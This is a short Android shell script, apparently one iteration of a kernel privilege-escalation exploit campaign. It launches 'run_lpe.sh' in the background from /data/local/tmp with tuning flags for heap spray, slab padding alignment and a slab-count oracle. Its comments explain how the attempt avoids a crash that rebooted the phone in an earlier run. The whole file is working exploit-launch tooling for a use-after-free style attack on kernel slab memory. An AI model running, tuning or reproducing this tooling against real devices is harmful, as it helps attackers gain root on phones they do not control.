#!/system/bin/sh
# run13: same geometry as run12 (aligned padding + early spray), plus the
# A -> B -> candidate slab-count oracle.  The oracle parks the attempt when
# any of the three hand-offs had to allocate a fresh 31-object slab, i.e.
# when the object at X is not a live candidate; reaping A in that state is
# what rebooted the phone during run12 attempt 1.  One attempt only: this
# round is for reading the counters, not for the slot lottery.
cd /data/local/tmp || exit 1
rm -f ic-run13.log
IC_SLABTRACE=1 IC_PAD_ALIGN=1 IC_SPRAY_EARLY=1 \
IC_PAD_KEEP=4185 IC_FLUSH_SPARSE=15 \
  ATTEMPTS=1 nohup sh /data/local/tmp/run_lpe.sh > /data/local/tmp/ic-run13.log 2>&1 &
exit 0
